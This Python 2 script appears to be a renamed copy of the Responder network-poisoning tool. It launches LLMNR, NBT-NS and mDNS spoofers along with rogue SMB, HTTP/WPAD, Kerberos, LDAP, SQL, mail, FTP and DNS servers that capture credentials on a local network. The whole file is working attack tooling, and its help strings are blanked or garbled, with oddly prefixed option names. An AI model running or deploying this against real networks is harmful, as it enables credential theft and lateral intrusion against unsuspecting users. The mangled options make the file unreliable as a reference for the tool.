#!/usr/bin/env python

import optparse
import ssl

from SocketServer import TCPServer, UDPServer, ThreadingMixIn
from threading import Thread
from utils import *

banner()

parser = optparse.OptionParser(usage='', version=settings.__version__, prog=sys.argv[0])
parser.add_option('-A','--2analyze',        action="store_true", help=".", dest="Analyze", default=False)
parser.add_option('-I','--2interface',      action="store",      help="", dest="Interface", metavar="eth0", default=None)
parser.add_option('-i','--2ip',      action="store",      help="Local IP to use \033[1m\033[31m(only for OSX)\033[0m", dest="OURIP", metavar="10.0.0.21", default=None)
parser.add_option('-b', '--2basic',         action="store_true", help="", dest="Basic", default=False)
parser.add_option('-r', '--2wredir',        action="store_true", help="e", dest="Wredirect", default=False)
parser.add_option('-d', '--2NBTNSdomain',   action="store_true", help="", dest="NBTNSDomain", default=False)
parser.add_option('-f','--2fingerprint',    action="store_true", help=".", dest="Finger", default=False)
parser.add_option('-w','--2wpad',           action="store_true", help="", dest="WPAD_On_Off", default=False)
parser.add_option('-u','--2upstream-proxy', action="store",      help="", dest="Upstream_Proxy", default=None)
parser.add_option('-F','--2ForceWpadAuth',  action="store_true", help="", dest="Force_WPAD_Auth", default=False)
parser.add_option('--2lm',                  action="store_true", help="", dest="LM_On_Off", default=False)
parser.add_option('-v','--2verbose',        action="store_true", help=".", dest="Verbose")
options, args = parser.parse_args()

if not os.geteuid() == 0:
    print color("[!] ponder must be run as admin.")
    sys.exit(-1)
elif options.OURIP is None and IsOsX() is True:
    print "\n\033[1m\033[31mOSX detected, -i mandatory option is missing\033[0m\n"
    parser.print_help()
    exit(-1)

settings.init()
settings.Config.populate(options)

StartupMessage()

settings.Config.ExpandIPRanges()

if settings.Config.AnalyzeMode:
	print color('[i] ponder', 3, 1)

class ThreadingUDPServer(ThreadingMixIn, UDPServer):
	def server_bind(self):
		if OsInterfaceIsSupported():
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
			except:
				pass
		UDPServer.server_bind(self)

class ThreadingTCPServer(ThreadingMixIn, TCPServer):
	def server_bind(self):
		if OsInterfaceIsSupported():
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
			except:
				pass
		TCPServer.server_bind(self)

class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
	def server_bind(self):
		MADDR = "224.0.0.251"
		
		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MADDR) + settings.Config.IP_aton)

		if OsInterfaceIsSupported():
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
			except:
				pass
		UDPServer.server_bind(self)

class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):
	def server_bind(self):
		MADDR = "224.0.0.252"

		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,socket.inet_aton(MADDR) + settings.Config.IP_aton)
		
		if OsInterfaceIsSupported():
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
			except:
				pass
		UDPServer.server_bind(self)

ThreadingUDPServer.allow_reuse_address = 1
ThreadingTCPServer.allow_reuse_address = 1
ThreadingUDPMDNSServer.allow_reuse_address = 1
ThreadingUDPLLMNRServer.allow_reuse_address = 1

def serve_thread_udp_broadcast(host, port, handler):
	try:
		server = ThreadingUDPServer(('', port), handler)
		server.serve_forever()
	except:
		print color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ", "

def serve_NBTNS_poisoner(host, port, handler):
	serve_thread_udp_broadcast(host, port, handler)

def serve_MDNS_poisoner(host, port, handler):
	try:
		server = ThreadingUDPMDNSServer((host, port), handler)
		server.serve_forever()
	except:
		print color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ", "

def serve_LLMNR_poisoner(host, port, handler):
	try:
		server = ThreadingUDPLLMNRServer((host, port), handler)
		server.serve_forever()
	except:
		print color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ","

def serve_thread_udp(host, port, handler):
	try:
		if OsInterfaceIsSupported():
			server = ThreadingUDPServer((settings.Config.Bind_To, port), handler)
			server.serve_forever()
		else:
			server = ThreadingUDPServer((host, port), handler)
			server.serve_forever()
	except:
		print color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ", ."

def serve_thread_tcp(host, port, handler):
	try:
		if OsInterfaceIsSupported():
			server = ThreadingTCPServer((settings.Config.Bind_To, port), handler)
			server.serve_forever()
		else:
			server = ThreadingTCPServer((host, port), handler)
			server.serve_forever()
	except:
		print color("[!] ", 1, 1) + "Error starting TCP server on port " + str(port) + ", "

def serve_thread_SSL(host, port, handler):
	try:

		cert = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLCert)
		key =  os.path.join(settings.Config.ResponderPATH, settings.Config.SSLKey)

		if OsInterfaceIsSupported():
			server = ThreadingTCPServer((settings.Config.Bind_To, port), handler)
			server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)
			server.serve_forever()
		else:
			server = ThreadingTCPServer((host, port), handler)
			server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)
			server.serve_forever()
	except:
		print color("[!] ", 1, 1) + "Error " + str(port) + ", ."

def main():
	try:
		threads = []

		
		from poisoners.LLMNR import LLMNR
		from poisoners.NBTNS import NBTNS
		from poisoners.MDNS import MDNS
		threads.append(Thread(target=serve_LLMNR_poisoner, args=('', 5355, LLMNR,)))
		threads.append(Thread(target=serve_MDNS_poisoner,  args=('', 5353, MDNS,)))
		threads.append(Thread(target=serve_NBTNS_poisoner, args=('', 137,  NBTNS,)))

		
		from servers.Browser import Browser
		threads.append(Thread(target=serve_thread_udp_broadcast, args=('', 138,  Browser,)))

		if settings.Config.HTTP_On_Off:
			from servers.HTTP import HTTP
			threads.append(Thread(target=serve_thread_tcp, args=('', 80, HTTP,)))

		if settings.Config.SSL_On_Off:
			from servers.HTTP import HTTPS
			threads.append(Thread(target=serve_thread_SSL, args=('', 443, HTTPS,)))

		if settings.Config.WPAD_On_Off:
			from servers.HTTP_Proxy import HTTP_Proxy
			threads.append(Thread(target=serve_thread_tcp, args=('', 3141, HTTP_Proxy,)))

		if settings.Config.SMB_On_Off:
			if settings.Config.LM_On_Off:
				from servers.SMB import SMB1LM
				threads.append(Thread(target=serve_thread_tcp, args=('', 445, SMB1LM,)))
				threads.append(Thread(target=serve_thread_tcp, args=('', 139, SMB1LM,)))
			else:
				from servers.SMB import SMB1
				threads.append(Thread(target=serve_thread_tcp, args=('', 445, SMB1,)))
				threads.append(Thread(target=serve_thread_tcp, args=('', 139, SMB1,)))

		if settings.Config.Krb_On_Off:
			from servers.Kerberos import KerbTCP, KerbUDP
			threads.append(Thread(target=serve_thread_udp, args=('', 88, KerbUDP,)))
			threads.append(Thread(target=serve_thread_tcp, args=('', 88, KerbTCP,)))

		if settings.Config.SQL_On_Off:
			from servers.MSSQL import MSSQL
			threads.append(Thread(target=serve_thread_tcp, args=('', 1433, MSSQL,)))

		if settings.Config.FTP_On_Off:
			from servers.FTP import FTP
			threads.append(Thread(target=serve_thread_tcp, args=('', 21, FTP,)))

		if settings.Config.POP_On_Off:
			from servers.POP3 import POP3
			threads.append(Thread(target=serve_thread_tcp, args=('', 110, POP3,)))

		if settings.Config.LDAP_On_Off:
			from servers.LDAP import LDAP
			threads.append(Thread(target=serve_thread_tcp, args=('', 389, LDAP,)))

		if settings.Config.SMTP_On_Off:
			from servers.SMTP import ESMTP
			threads.append(Thread(target=serve_thread_tcp, args=('', 25,  ESMTP,)))
			threads.append(Thread(target=serve_thread_tcp, args=('', 587, ESMTP,)))

		if settings.Config.IMAP_On_Off:
			from servers.IMAP import IMAP
			threads.append(Thread(target=serve_thread_tcp, args=('', 143, IMAP,)))

		if settings.Config.DNS_On_Off:
			from servers.DNS import DNS, DNSTCP
			threads.append(Thread(target=serve_thread_udp, args=('', 53, DNS,)))
			threads.append(Thread(target=serve_thread_tcp, args=('', 53, DNSTCP,)))

		for thread in threads:
			thread.setDaemon(True)
			thread.start()

		print color('[+]', 2, 1) + " Listening"

		while True:
			time.sleep(1)

	except KeyboardInterrupt:
		sys.exit("\r%s Exiting..." % color('[+]', 2, 1))

if __name__ == '__main__':
	main()
